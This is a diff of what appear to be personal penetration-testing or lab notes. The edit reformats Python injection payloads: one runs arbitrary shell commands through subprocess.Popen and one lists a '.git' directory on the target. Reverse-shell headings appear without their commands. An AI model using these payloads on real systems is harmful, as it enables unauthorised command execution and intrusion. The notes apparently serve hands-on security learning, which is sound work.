@@ -50,9 +50,13 @@ _Host:_ `<host>`
 
 > _Note:_ While I am aware that a Reverse/Bind/PHP/HTA shell(s) would be optimal, for my own personal growth, I am going to keep my initial payloads under direct-execution manually. For the most part, or untilI feel satisifed with my manual operations.
 
-__Initial Subprocess Popen Exec__`a=__import__('subprocess');out=a.Popen([''],shell=True,stdout=a.PIPE,stderr=a.STDOUT).communicate()[0].decode();print(out)`
+__Initial Subprocess Popen Exec__
 
-__Simple Directory Enum__ `b=__import__('os');print(b.listdir('/opt/dev/.git'))`
+`a=__import__('subprocess');out=a.Popen([''],shell=True,stdout=a.PIPE,stderr=a.STDOUT).communicate()[0].decode();print(out)`
+
+__Simple Directory Enum__ 
+
+`b=__import__('os');print(b.listdir('/opt/dev/.git'))`
     
 
 __Multiple File Reading__
@@ -71,6 +75,7 @@ __Reverse Shell (Bash)__
 __Reverse Shell (PHP)__
 
 > _Note:_ Not confirmed that `php` is installed.
+
 
 
 
